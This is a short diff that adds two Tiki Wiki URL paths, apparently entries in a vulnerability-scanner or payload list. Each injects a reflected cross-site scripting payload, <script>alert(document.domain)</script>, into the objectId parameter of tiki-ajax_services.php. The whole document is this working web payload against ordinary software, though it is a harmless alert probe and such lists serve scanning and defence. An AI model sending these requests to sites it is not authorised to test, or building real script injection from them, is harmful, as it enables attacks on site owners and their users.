@@ -1,0 +1,2 @@
+/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
+/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
